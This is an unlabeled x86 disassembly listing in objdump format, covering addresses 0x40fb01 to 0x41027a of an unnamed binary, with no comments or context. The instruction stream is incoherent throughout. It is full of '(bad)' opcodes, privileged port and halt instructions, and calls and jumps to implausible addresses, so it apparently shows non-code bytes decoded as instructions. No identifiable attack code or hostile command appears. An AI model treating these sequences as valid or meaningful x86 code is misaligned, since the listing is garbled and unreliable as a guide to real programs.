  40fb01:	mov    ecx,DWORD PTR [ebp-0x4]
  40fb04:	mov    ecx,DWORD PTR [eax]
  40fb06:	adc    BYTE PTR [ebp-0x80],al
  40fb09:	jmp    0x40fb0c
  40fb0b:	mov    eax,DWORD PTR [eax]
  40fb0d:	cld    
  40fb0e:	mov    bh,0xc6
  40fb10:	push   ecx
  40fb11:	(bad)  
  40fb12:	jne    0x40fb72
  40fb14:	dec    ecx
  40fb16:	or     BYTE PTR [ecx+ebx*1],cl
  40fb19:	push   ebp
  40fb1a:	inc    ebp
  40fb1b:	in     al,dx
  40fb1c:	add    ebp,esp
  40fb1e:	or     bh,al
  40fb20:	dec    ebp
  40fb21:	cld    
  40fb22:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  40fb28:	xor    DWORD PTR [edx],0x2
  40fb2b:	pushf  
  40fb2c:	dec    DWORD PTR [ebx+0x45510cf4]
  40fb32:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  40fb38:	mov    edx,DWORD PTR [ecx+0xc]
  40fb3b:	xor    eax,esi
  40fb3d:	mov    edx,0xc172c7
  40fb42:	inc    ebp
  40fb43:	mov    esi,DWORD PTR [ebp+0x8]
  40fb46:	mov    eax,edx
  40fb48:	call   0x84c5c23d
  40fb4d:	add    DWORD PTR [ebx-0x76bace00],ebx
  40fb53:	mov    ebp,eax
  40fb55:	or     BYTE PTR [eax],dl
  40fb57:	jo     0x40fba6
  40fb59:	push   edi
  40fb5a:	xor    esi,DWORD PTR [ebp+0x3]
  40fb5d:	(bad)  
  40fb5e:	pmulhuw mm0,mm1
  40fb61:	test   DWORD PTR [ebp-0x8],ecx
  40fb64:	mov    DWORD PTR [ebp-0x67],eax
  40fb67:	mov    eax,DWORD PTR [ebp-0x4]
  40fb6a:	xor    edi,DWORD PTR [ebp-0x73]
  40fb6d:	xor    eax,DWORD PTR [ebx]
  40fb6f:	xor    esi,DWORD PTR [edx+0x3]
  40fb72:	add    BYTE PTR [ecx],bh
  40fb74:	inc    ebp
  40fb75:	(bad)  
  40fb76:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  40fb7c:	mov    DWORD PTR [eax],0x750f0004
  40fb82:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  40fb88:	lock add BYTE PTR [ebp+0x0],cl
  40fb8c:	mov    esi,DWORD PTR [ebp-0x18]
  40fb8f:	mov    ebp,edx
  40fb91:	or     al,0x72
  40fb93:	ja     0x40fb95
  40fb95:	mov    edx,esi
  40fb97:	cld    
  40fb98:	(bad)  
  40fb9b:	cli    
  40fb9c:	mov    esi,DWORD PTR [ebp-0x4]
  40fb9f:	cmp    ecx,esi
  40fba1:	bswap  edi
  40fba3:	(bad)
  40fba7:	mov    esi,DWORD PTR [ebp-0x4]
  40fbaa:	mov    esi,ecx
  40fbac:	clc    
  40fbad:	repnz add esi,DWORD PTR [ebp+0x45]
  40fbb1:	push   ebx
  40fbb2:	xor    eax,DWORD PTR [ebp+0x3]
  40fbb5:	cmp    al,0x5f
  40fbb7:	pushf  
  40fbb8:	pop    ebx
  40fbb9:	jmp    0x40fc80
  40fbbe:	mov    esi,DWORD PTR [ebp-0x7d]
  40fbc1:	xor    ebp,DWORD PTR [eax]
  40fbc3:	lea    eax,[ebp-0x8]
  40fbc6:	xor    edx,esi
  40fbc8:	pushf  
  40fbc9:	out    dx,eax
  40fbca:	(bad)  
  40fbcb:	neg    eax
  40fbcd:	ins    DWORD PTR es:[edi],dx
  40fbce:	test   esi,edi
  40fbd0:	clc    
  40fbd1:	pop    esp
  40fbd2:	inc    ebp
  40fbd3:	or     BYTE PTR [ecx+0x450f0c7d],cl
  40fbd9:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  40fbdf:	add    cl,al
  40fbe1:	jne    0x40fb7e
  40fbe3:	mov    esi,DWORD PTR [edx]
  40fbe5:	in     al,dx
  40fbe6:	push   esi
  40fbe7:	xor    BYTE PTR [ebp-0xe],dh
  40fbea:	add    edi,esi
  40fbec:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  40fbf2:	add    cl,bh
  40fbf4:	mov    edi,DWORD PTR [ebp+0x8]
  40fbf7:	mov    DWORD PTR [ebp-0x14],esi
  40fbfa:	add    esi,DWORD PTR [ebp+0x3c]
  40fbfd:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  40fc03:	mov    ah,0x3e
  40fc05:	fwait
  40fc06:	pushf  
  40fc07:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  40fc0d:	jne    0x40fb9a
  40fc0f:	mov    ecx,DWORD PTR [esp+ebp*8]
  40fc12:	icebp  
  40fc13:	icebp  
  40fc14:	shl    edx,0xf2
  40fc17:	(bad)  
  40fc18:	mov    ah,0x16
  40fc1a:	push   eax
  40fc1b:	jne    0x40fbb0
  40fc1d:	mov    ecx,DWORD PTR [edi]
  40fc1f:	in     al,dx
  40fc20:	jmp    0x40fc13
  40fc22:	add    dl,dh
  40fc24:	mov    edi,esi
  40fc26:	or     al,0x8
  40fc28:	inc    ebp
  40fc29:	jne    0x40fc2e
  40fc2b:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  40fc31:	ret    
  40fc32:	or     bh,bh
  40fc34:	jge    0x40fc1e
  40fc36:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  40fc3c:	xor    edi,eax
  40fc3e:	add    esi,DWORD PTR [ebp-0x77]
  40fc41:	mov    ebx,esp
  40fc43:	clc    
  40fc44:	neg    DWORD PTR [ebp-0x7c]
  40fc47:	xor    eax,DWORD PTR [eax]
  40fc49:	cmp    eax,DWORD PTR [eax]
  40fc4b:	repz jne 0x40fbe3
  40fc4e:	xor    eax,DWORD PTR [ecx]
  40fc50:	add    ebx,DWORD PTR [eax]
  40fc52:	mov    DWORD PTR [ebp-0x8],eax
  40fc55:	mov    eax,edi
  40fc57:	cld    
  40fc58:	lock pop eax
  40fc5a:	test   DWORD PTR [ebx],esi
  40fc5c:	clc    
  40fc5d:	add    edx,DWORD PTR [edi-0x740bff77]
  40fc63:	fdivp  st(4),st
  40fc65:	test   ecx,esi
  40fc67:	(bad)  
  40fc68:	jnp    0x40fc69
  40fc6a:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  40fc70:	jae    0x40fbfd
  40fc72:	sub    edi,esp
  40fc74:	(bad)  
  40fc75:	shl    DWORD PTR [eax-0x3e],0x89
  40fc79:	leave  
  40fc7a:	call   0x8196b387
  40fc7f:	in     al,dx
  40fc80:	(bad)  
  40fc81:	in     al,dx
  40fc82:	add    bh,al
  40fc84:	mov    esp,edi
  40fc86:	in     al,dx
  40fc87:	test   DWORD PTR [ebp-0x8],edi
  40fc8a:	mov    eax,DWORD PTR [ebp+0x2b]
  40fc8d:	xor    al,BYTE PTR [ebx]
  40fc8f:	pushf  
  40fc90:	jnp    0x572ff8c9
  40fc96:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  40fc9a:	loopne 0x40fccf
  40fc9c:	jne    0x40fc59
  40fc9e:	mov    esi,DWORD PTR [edx-0x20]
  40fca1:	add    BYTE PTR [ebp-0x3d],bh
  40fca4:	xor    eax,DWORD PTR [ebp-0x73]
  40fca7:	mov    edi,DWORD PTR [esi]
  40fca9:	cld    
  40fcaa:	jb     0x40fc72
  40fcac:	add    bl,al
  40fcae:	jne    0x40fcf5
  40fcb0:	mov    edx,DWORD PTR [edi-0x10]
  40fcb3:	jge    0x40fd32
  40fcb5:	mov    esi,DWORD PTR [ebx]
  40fcb7:	lock add ecx,DWORD PTR [ebp+0x3b]
  40fcbb:	xor    esi,DWORD PTR [ebp-0x77]
  40fcbe:	mov    esi,eax
  40fcc0:	lock inc ebp
  40fcc2:	jge    0x40fcf5
  40fcc4:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  40fccb:	dec    ebp
  40fccc:	mov    esi,DWORD PTR [ebx]
  40fcce:	loopne 0x40fc59
  40fcd0:	jge    0x40fcca
  40fcd2:	add    DWORD PTR [ebp-0x7d],eax
  40fcd5:	icebp  
  40fcd6:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  40fcdd:	dec    ebp
  40fcde:	hlt    
  40fcdf:	xor    ebx,DWORD PTR [ebp-0x77]
  40fce2:	mov    esi,esp
  40fce4:	in     al,0x45
  40fce6:	jge    0x40fd25
  40fce8:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  40fcef:	dec    ebp
  40fcf0:	push   esp
  40fcf1:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  40fcf7:	inc    ebp
  40fcf8:	hlt    
  40fcf9:	xor    DWORD PTR [ebp-0x61],esi
  40fcfc:	mov    edi,DWORD PTR [eax+0xf19504]
  40fd02:	repnz mov DWORD PTR [ebp+0x20],ebx
  40fd06:	cmp    eax,DWORD PTR [ebp+0xf]
  40fd09:	test   DWORD PTR [edi+ecx*1-0x1],edx
  40fd0d:	fistp  WORD PTR [ebx+0x0]
  40fd10:	inc    ebp
  40fd11:	mov    ebx,DWORD PTR [edi+0xc]
  40fd14:	add    eax,eax
  40fd16:	inc    ebp
  40fd17:	test   BYTE PTR [ebx],dh
  40fd19:	add    eax,DWORD PTR [ebx]
  40fd1b:	add    BYTE PTR [esi+0x45],bl
  40fd1e:	ret    0x85
  40fd21:	jnp    0x544180f0
  40fd27:	inc    bp
  40fd29:	inc    ebp
  40fd2a:	xor    DWORD PTR [ecx+0xc78a9c],edi
  40fd30:	fdiv   QWORD PTR [ebx]
  40fd32:	test   DWORD PTR [ecx+0x453bf8],edi
  40fd38:	push   ebx
  40fd39:	add    edi,DWORD PTR [esi+0x708088b]
  40fd3f:	cmp    esi,eax
  40fd41:	setnp  BYTE PTR [ecx-0x74fcffce]
  40fd48:	mov    esp,edi
  40fd4a:	call   0x33cc429c
  40fd4f:	or     BYTE PTR [ebx],al
  40fd51:	inc    ecx
  40fd52:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  40fd58:	and    BYTE PTR [ebp-0x7074f0bb],al
  40fd5e:	lock add cl,al
  40fd61:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  40fd68:	mov    ch,0x45
  40fd6a:	clc    
  40fd6b:	xor    eax,DWORD PTR [ebp+0x3]
  40fd6e:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  40fd74:	inc    ebp
  40fd75:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  40fd7b:	mov    edi,eax
  40fd7d:	mov    eax,DWORD PTR [ebp+0x3c]
  40fd80:	mov    ecx,DWORD PTR [eax]
  40fd82:	hlt    
  40fd83:	inc    ebp
  40fd84:	ror    DWORD PTR [ebx+0x818c45],0xf4
  40fd8b:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  40fd91:	push   ebp
  40fd92:	mov    edi,DWORD PTR [ebx]
  40fd94:	in     al,dx
  40fd95:	jne    0x40fd58
  40fd97:	mov    eax,DWORD PTR [ebp-0x28]
  40fd9a:	add    DWORD PTR [eax],0xe8058dec
  40fda0:	clc    
  40fda1:	mov    esi,DWORD PTR [edi-0x8]
  40fda4:	add    dh,dl
  40fda6:	rol    WORD PTR [ebp-0x1],cl
  40fdaa:	mov    edx,DWORD PTR [eax+0x8]
  40fdad:	jne    0x40fd6f
  40fdaf:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  40fdb6:	inc    ebp
  40fdb7:	push   esp
  40fdb8:	test   DWORD PTR [ecx+0xf],ecx
  40fdbb:	sub    edx,esp
  40fdbd:	add    eax,DWORD PTR [eax]
  40fdbf:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  40fdc5:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  40fdcc:	mov    eax,DWORD PTR [ecx]
  40fdce:	and    BYTE PTR [eax],al
  40fdd0:	cmp    al,0x10
  40fdd2:	add    BYTE PTR [ebp+0x66],al
  40fdd5:	inc    ecx
  40fdd7:	push   esp
  40fdd8:	add    dh,BYTE PTR [ebp+0x0]
  40fddb:	push   edx
  40fddc:	enterw 0xc1,0x4d
  40fde1:	mov    esp,DWORD PTR [esi+0x20]
  40fde4:	add    DWORD PTR [ecx-0x7b],eax
  40fde7:	add    eax,DWORD PTR [ebx]
  40fde9:	str    WORD PTR [eax+0x45]
  40fded:	lea    ecx,[ebx+0x45890801]
  40fdf3:	sbb    BYTE PTR [ebx],al
  40fdf5:	dec    ebp
  40fdf6:	cmp    al,0xf
  40fdf8:	inc    ebp
  40fdf9:	push   eax
  40fdfa:	mov    esi,DWORD PTR [ebx]
  40fdfc:	push   eax
  40fdfd:	add    eax,eax
  40fdff:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  40fe06:	inc    ebp
  40fe07:	add    BYTE PTR [ecx],dh
  40fe09:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  40fe10:	(bad)  
  40fe11:	mov    ebx,eax
  40fe13:	loopne 0x40fe5a
  40fe15:	dec    ebp
  40fe16:	mov    ecx,DWORD PTR [edi]
  40fe18:	cld    
  40fe19:	push   eax
  40fe1a:	xchg   DWORD PTR [ebx],esi
  40fe1c:	add    DWORD PTR [ebx],ebp
  40fe1e:	add    BYTE PTR [ebx],ch
  40fe20:	or     BYTE PTR [ecx],bh
  40fe22:	dec    ecx
  40fe23:	loopne 0x40fe28
  40fe25:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  40fe2b:	push   ebp
  40fe2c:	add    DWORD PTR [ebx+0x55100800],eax
  40fe32:	dec    ebp
  40fe33:	jmp    0x40fdbe
  40fe35:	mov    esp,DWORD PTR [eax]
  40fe37:	sbb    dl,dl
  40fe39:	inc    eax
  40fe3a:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  40fe40:	add    BYTE PTR [ebx+0x74528555],cl
  40fe46:	push   ebp
  40fe47:	div    DWORD PTR [ebx]
  40fe49:	and    eax,DWORD PTR [ebx]
  40fe4b:	add    edx,DWORD PTR [edx-0x30]
  40fe4e:	jno    0x40fddb
  40fe50:	inc    DWORD PTR [eax+eiz*1]
  40fe53:	inc    ebp
  40fe54:	push   eax
  40fe55:	push   eax
  40fe56:	mov    esp,DWORD PTR [edi-0x74beff1c]
  40fe5c:	mov    edi,esp
  40fe5e:	push   eax
  40fe5f:	inc    ebp
  40fe60:	enter  0x458b,0x8
  40fe64:	push   ecx
  40fe65:	(bad)  
  40fe66:	call   0x10b083e
  40fe6b:	pop    ss
  40fe6c:	push   ebp
  40fe6d:	mov    ecx,DWORD PTR [ebx+0x489408]
  40fe73:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  40fe79:	push   ecx
  40fe7a:	jo     0x40fe64
  40fe7c:	inc    DWORD PTR [edi]
  40fe7e:	or     BYTE PTR [eax],al
  40fe80:	call   0xcc05ca
  40fe85:	fmul   QWORD PTR [ebp+0x55]
  40fe88:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  40fe8e:	mov    bh,0x8c
  40fe90:	adc    al,0x9b
  40fe92:	dec    esp
  40fe93:	xor    bl,BYTE PTR [eax]
  40fe95:	mov    ecx,DWORD PTR [ebp+0xc]
  40fe98:	mov    eax,DWORD PTR [ebp-0x4]
  40fe9b:	mov    esi,DWORD PTR [edi-0x3148f924]
  40fea1:	push   es
  40fea2:	retf   
  40fea3:	mov    BYTE PTR [ebp-0x30],0x3b
  40fea7:	inc    ebp
  40fea8:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  40feaf:	retf   0x83fc
  40feb2:	into   
  40feb3:	dec    ebp
  40feb4:	retf   
  40feb5:	mov    ecx,DWORD PTR [ebp-0x74]
  40feb8:	mov    eax,DWORD PTR [eax]
  40feba:	fdiv   QWORD PTR [ebx]
  40febc:	mov    bh,0x3
  40febe:	push   es
  40febf:	mov    esi,ecx
  40fec1:	sbb    cl,dl
  40fec3:	dec    ebp
  40fec4:	sar    DWORD PTR [ebx],cl
  40fec6:	push   ebp
  40fec7:	jne    0x40fed8
  40fec9:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  40fecf:	lea    ebx,[eax]
  40fed1:	call   0xf4ca8a98
  40fed6:	sbb    dh,dl
  40fed8:	add    edx,ebx
  40feda:	push   ebp
  40fedb:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  40fee1:	push   ecx
  40fee2:	mov    DWORD PTR [eax-0x30],edx
  40fee5:	test   DWORD PTR [edx],eax
  40fee7:	xadd   esp,esi
  40feea:	pop    es
  40feeb:	add    cl,dl
  40feed:	mov    eax,ecx
  40feef:	or     al,0x45
  40fef1:	(bad)  
  40fef2:	push   eax
  40fef3:	add    DWORD PTR [edx+0x0],eax
  40fef6:	add    ecx,DWORD PTR [ecx]
  40fef8:	and    dh,cl
  40fefa:	call   0xc507ca
  40feff:	add    DWORD PTR [ebp+0x0],edx
  40ff02:	mov    esp,DWORD PTR [ebp+0x18]
  40ff05:	add    BYTE PTR [eax+0x50],cl
  40ff08:	xor    eax,DWORD PTR [eax]
  40ff0a:	add    esp,DWORD PTR [esi+0x3b]
  40ff0d:	inc    ebp
  40ff0e:	je     0x40fe93
  40ff10:	push   ecx
  40ff11:	dec    BYTE PTR [ebp-0x77]
  40ff14:	add    eax,esi
  40ff16:	or     al,0x5e
  40ff18:	inc    eax
  40ff19:	add    BYTE PTR [ebx],al
  40ff1b:	data16 and BYTE PTR [ebp+0x50],al
  40ff1f:	sub    DWORD PTR [ecx],0xfffffff8
  40ff22:	add    BYTE PTR [ebp-0x75],ah
  40ff25:	add    BYTE PTR [eax],bl
  40ff27:	enter  0x894d,0x8b
  40ff2b:	int3   
  40ff2c:	loopne 0x40fef0
  40ff2e:	rol    BYTE PTR [eax],0x33
  40ff31:	lea    cx,[ebp+0xa]
  40ff35:	data16 jb 0x40ff7d
  40ff38:	add    BYTE PTR [ebx+0x44890855],cl
  40ff3e:	sbb    ah,al
  40ff40:	inc    ebp
  40ff41:	cmp    al,0xf
  40ff43:	add    BYTE PTR [edx+0x66],dl
  40ff46:	xor    ecx,DWORD PTR [eax]
  40ff48:	sub    eax,DWORD PTR [edx]
  40ff4a:	mov    eax,DWORD PTR [eax]
  40ff4c:	or     al,0x66
  40ff4e:	ror    edx,cl
  40ff50:	dec    ebp
  40ff51:	inc    ebp
  40ff52:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  40ff58:	cld    
  40ff59:	or     BYTE PTR [edi+0x4501dd],dl
  40ff5f:	ret    0xecce
  40ff62:	retf   
  40ff63:	(bad)  
  40ff64:	dec    ebp
  40ff65:	mov    al,0x8b
  40ff67:	loopne 0x40ff89
  40ff69:	cmp    ecx,DWORD PTR [edx]
  40ff6b:	inc    ebp
  40ff6c:	daa    
  40ff6d:	loopne 0x40fef6
  40ff6f:	in     al,dx
  40ff70:	add    edi,eax
  40ff72:	add    BYTE PTR [eax+0x3f52e155],bh
  40ff78:	push   ebp
  40ff79:	inc    ebp
  40ff7a:	xor    ebx,edx
  40ff7c:	add    ebp,esp
  40ff7e:	push   edx
  40ff7f:	push   bp
  40ff81:	inc    ebp
  40ff82:	(bad)  
  40ff83:	in     eax,dx
  40ff84:	push   esp
  40ff85:	(bad)  
  40ff86:	inc    edx
  40ff88:	sbb    al,0x33
  40ff8a:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  40ff91:	add    BYTE PTR [ebp+0x46],0x8b
  40ff95:	jmp    0xf98b:0x100041c8
  40ff9c:	xor    esi,DWORD PTR [edx+0x3]
  40ff9f:	mov    ecx,DWORD PTR [edi]
  40ffa1:	fmul   DWORD PTR [edx]
  40ffa3:	add    BYTE PTR [eax],al
  40ffa5:	lea    eax,[ebx-0x4700273c]
  40ffab:	add    al,0x4f
  40ffad:	pop    DWORD PTR [eax]
  40ffaf:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  40ffb5:	push   edx
  40ffb6:	inc    WORD PTR [ebp+0x8]
  40ffba:	mov    eax,0x514f4d
  40ffbf:	(bad)
  40ffc3:	add    al,al
  40ffc5:	xor    DWORD PTR [ebx-0x74baf730],eax
  40ffcb:	test   DWORD PTR [esi+0x74],esp
  40ffce:	inc    ebp
  40ffcf:	mov    DWORD PTR [eax+0xa4e08],edi
  40ffd5:	add    BYTE PTR [ecx-0x76c435bb],cl
  40ffdb:	or     dh,cl
  40ffdd:	or     eax,0x8b8d5045
  40ffe2:	inc    ebp
  40ffe3:	mov    WORD PTR [ecx+0x3b8a00],?
  40ffe9:	jne    0x41001e
  40ffeb:	mov    edi,DWORD PTR [edx+0x8f3b18]
  40fff1:	add    DWORD PTR [ebx],eax
  40fff3:	add    bh,bh
  40fff5:	adc    DWORD PTR [eax],ecx
  40fff7:	adc    DWORD PTR [ebp+0x55],edi
  40fffa:	push   es
  40fffb:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  410001:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  410008:	inc    ebp
  410009:	mov    esp,edi
  41000b:	or     al,0xda
  41000d:	push   eax
  41000e:	(bad)  
  41000f:	jne    0x40ffc5
  410011:	call   0x38f900
  410016:	inc    ebp
  410017:	sar    BYTE PTR [eax],0x84
  41001a:	in     al,dx
  41001b:	add    bh,al
  41001d:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  410024:	(bad)  
  410025:	and    al,al
  410027:	fs in  eax,dx
  410029:	inc    DWORD PTR [ebp-0x7b]
  41002c:	jle    0x41003d
  41002e:	leave  
  41002f:	scas   al,BYTE PTR es:[edi]
  410030:	inc    esp
  410031:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  410038:	or     BYTE PTR [ebx-0x97717c8],0x83
  41003f:	call   DWORD PTR [edi]
  410041:	shr    ah,0x84
  410044:	xchg   DWORD PTR [eax],eax
  410046:	add    DWORD PTR [eax],eax
  410048:	add    bh,bh
  41004a:	dec    ebp
  41004b:	and    BYTE PTR [ecx-0x38],dl
  41004e:	push   eax
  41004f:	dec    DWORD PTR [ebx+0xfd885]
  410055:	mov    BYTE PTR [ebp+0x508bac00],cl
  41005b:	mov    WORD PTR [ecx+0x0],ss
  41005e:	lea    ecx,[ebx+0x108b20d8]
  410064:	mov    WORD PTR [edx],ds
  410066:	add    BYTE PTR [edi+0xff01ff],al
  41006c:	mov    ecx,DWORD PTR [ebp-0x28]
  41006f:	push   ecx
  410070:	shl    BYTE PTR [ebp+0x3a],0x8b
  410074:	inc    ebp
  410075:	in     al,0xeb
  410077:	jno    0x410004
  410079:	push   edx
  41007a:	mov    DWORD PTR [eax-0x28],edx
  41007d:	mov    eax,DWORD PTR [ebp+0x20]
  410080:	je     0x410009
  410082:	mov    eax,DWORD PTR [ecx]
  410084:	sbb    BYTE PTR [eax],al
  410086:	pop    DWORD PTR [eax]
  410088:	add    esi,eax
  41008a:	add    bl,al
  41008c:	adc    DWORD PTR [edi],esi
  41008e:	jmp    0x8bcc50e0
  410093:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  41009a:	jne    0x410027
  41009c:	mov    ecx,DWORD PTR [eax]
  41009e:	in     al,0x75
  4100a0:	pop    DWORD PTR [ecx+0x5401]
  4100a6:	push   edx
  4100a7:	inc    DWORD PTR [ebx]
  4100a9:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4100af:	add    BYTE PTR [edi+0x9],dl
  4100b2:	call   DWORD PTR [esi]
  4100b4:	and    dl,al
  4100b6:	and    bh,bh
  4100b8:	inc    edi
  4100ba:	test   eax,edx
  4100bc:	sldt   ebx
  4100bf:	xor    al,BYTE PTR [eax]
  4100c1:	pushf  
  4100c2:	(bad)  
  4100c3:	jmp    0x4100d1
  4100c5:	mov    eax,edi
  4100c7:	or     al,0x75
  4100c9:	inc    eax
  4100ca:	call   0x40f7d2
  4100cf:	mov    eax,eax
  4100d1:	loopne 0x410057
  4100d3:	inc    ebp
  4100d4:	add    BYTE PTR [ebx+0x1451c00],cl
  4100da:	mov    eax,DWORD PTR [ebp+0x20]
  4100dd:	add    edi,ecx
  4100df:	add    BYTE PTR [eax],ch
  4100e1:	cmp    edi,0x18
  4100e4:	test   DWORD PTR [ebp+0xf],esi
  4100e7:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  4100ee:	jne    0x4100f2
  4100f0:	call   0xff9ffbb5
  4100f5:	leave  
  4100f6:	rcr    BYTE PTR [esp+eax*4],0x55
  4100fa:	add    ah,ch
  4100fc:	add    BYTE PTR [edi-0x48fef979],dh
  410102:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  410109:	inc    esp
  41010a:	mov    ebx,DWORD PTR [eax]
  41010c:	fcom   st(2)
  41010e:	add    BYTE PTR [edi],bl
  410110:	lea    ecx,[eax-0x18]
  410113:	(bad)  
  410114:	push   DWORD PTR [ecx]
  410116:	call   0xffb34e78
  41011b:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  41011f:	fstp   DWORD PTR [esi+ebx*8]
  410122:	push   ebp
  410123:	pop    ebp
  410124:	mov    esi,DWORD PTR [edx-0x38]
  410127:	add    DWORD PTR [eax],0x28
  41012a:	mov    edi,DWORD PTR [ebx]
  41012c:	xor    esi,DWORD PTR [edx+0x3]
  41012f:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  410133:	pop    ebp
  410134:	or     al,0x4
  410136:	inc    ecx
  410137:	push   ebp
  410138:	(bad)  
  410139:	in     al,dx
  41013a:	or     ah,ch
  41013c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41013d:	xbegin 0xffc67733
  410143:	clc    
  410144:	adc    al,0x45
  410146:	div    BYTE PTR [edx]
  410148:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  41014f:	test   DWORD PTR [ebx+0x666300f8],ebx
  410155:	add    BYTE PTR [ecx+0x66],dh
  410158:	add    eax,DWORD PTR [ebp+0x52]
  41015b:	adc    eax,0xffffffa0
  41015e:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  410164:	test   DWORD PTR [eax],eax
  410166:	clc    
  410167:	data16 or al,BYTE PTR [ebp+0x45]
  41016b:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  410172:	rol    BYTE PTR [ebp+0x45],1
  410175:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  41017b:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  410181:	push   ebx
  410182:	add    BYTE PTR [eax+eax*1+0x51],dl
  410186:	jge    0x4101bb
  410188:	add    BYTE PTR [esi+0x4],dl
  41018b:	jne    0x4101f2
  41018d:	mov    edx,0x457200
  410192:	jmp    0x410156
  410194:	xor    edi,DWORD PTR [ebx]
  410196:	pop    edi
  410197:	cvtdq2ps xmm7,xmm0
  41019a:	ret    0x0
  41019d:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4101a3:	xor    ecx,DWORD PTR [edi]
  4101a5:	add    eax,DWORD PTR [ecx+0x3b]
  4101a8:	push   ebx
  4101a9:	rdpmc  
  4101ab:	out    0x8d,al
  4101ad:	add    BYTE PTR [eax],cl
  4101af:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4101b5:	ret    0x450c
  4101b8:	sbb    al,0x8b
  4101ba:	cmp    eax,esi
  4101bc:	or     cl,al
  4101be:	or     al,0xc2
  4101c0:	pop    eax
  4101c1:	inc    ebp
  4101c2:	add    ecx,DWORD PTR [edi]
  4101c4:	add    esi,DWORD PTR [ebp+0x39]
  4101c7:	invd   
  4101c9:	jge    0x4101d5
  4101cb:	mov    eax,0x478ac0
  4101d0:	cli    
  4101d1:	xor    esp,ecx
  4101d3:	mov    ebx,0x5b8ac0
  4101d8:	ret    0x33
  4101db:	mov    eax,0x833b8b
  4101e0:	sub    BYTE PTR [ebx],al
  4101e2:	inc    ebp
  4101e3:	xor    ax,di
  4101e6:	pushf  
  4101e7:	inc    bh
  4101e9:	mov    esp,esp
  4101eb:	hlt    
  4101ec:	test   DWORD PTR [ebp-0x8],esi
  4101ef:	mov    eax,DWORD PTR [ebp-0x14]
  4101f2:	xor    ecx,DWORD PTR [ebx-0x76478864]
  4101f8:	dec    edi
  4101f9:	or     BYTE PTR [eax],al
  4101fb:	jne    0x410186
  4101fd:	mov    esi,esp
  4101ff:	call   0x77a78dc4
  410204:	inc    ebp
  410205:	mov    DWORD PTR [eax+0x9b4f0c],edi
  41020b:	add    BYTE PTR [ecx-0x3ffe0717],cl
  410211:	add    BYTE PTR [esi+0x7d],ah
  410214:	inc    ebp
  410215:	mov    bx,WORD PTR [ebp+0x8]
  410219:	add    DWORD PTR [ebp+0x54],0x30c008b
  410220:	inc    ebp
  410221:	mov    bx,di
  410224:	lock test BYTE PTR [ecx+0x7000801],bh
  41022b:	jge    0x4101ee
  41022d:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  410233:	cli    
  410234:	xor    bl,bh
  410236:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  41023c:	test   BYTE PTR [eax],cl
  41023e:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  410245:	cmp    ebp,eax
  410247:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  41024e:	test   BYTE PTR [ebp+0x1],bh
  410251:	mov    ebx,0x458a00
  410256:	xor    esi,DWORD PTR [ebx]
  410258:	add    esp,DWORD PTR [esi-0x77]
  41025b:	pop    ebp
  41025c:	loopne 0x4102c4
  41025e:	inc    ebp
  41025f:	clc    
  410260:	xor    edi,DWORD PTR [ebx]
  410262:	add    esi,DWORD PTR [edx-0x77]
  410265:	data16 fdivr QWORD PTR [ebp-0x49]
  410269:	mov    ebx,0xb78afc
  41026e:	hlt    
  41026f:	xor    edi,DWORD PTR [esi+eiz*2]
  410272:	add    BYTE PTR [ebp+0x66],bl
  410275:	data16 lock clc 
  410278:	cmp    al,0x3b
  41027a:	add    BYTE PTR [edi+0x66],dh
